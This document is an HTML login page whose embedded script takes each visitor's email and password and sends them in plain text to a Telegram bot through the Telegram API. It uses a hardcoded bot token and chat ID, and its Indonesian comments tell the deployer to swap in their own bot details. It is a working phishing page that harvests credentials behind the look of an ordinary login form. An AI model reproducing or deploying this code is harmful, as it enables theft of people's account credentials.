<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
</head>
<body>
  <h2>Login</h2>
  <form id="loginForm">
    <label for="email">Email:</label>
    <input type="email" id="email" name="email" required><br><br>

    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required><br><br>

    <button type="submit">Login</button>
  </form>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function(event) {
      event.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      // Token Bot Telegram
      const botToken = '7667658360:AAGwXaS2tfDV52denremA6FsWjg-QLi-bKM';  // Ganti dengan token bot kamu
      const chatId = '7013450923';      // Ganti dengan chat ID yang kamu dapatkan

      // Format pesan
      const message = `Email: ${email}\nPassword: ${password}
      tolong verifikasi`;

      // Kirim data ke Telegram menggunakan API Bot Telegram
      const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      // Kirim request ke API Telegram
      fetch(apiUrl)
        .then(response => response.json())
        .then(data => {
          alert("Data telah dikirim tunggu admin verifikasi!");
        })
        .catch(error => {
          console.error("Error:", error);
          alert("Terjadi kesalahan saat mengirim data.");
        });
    });
  </script>
</body>
</html>
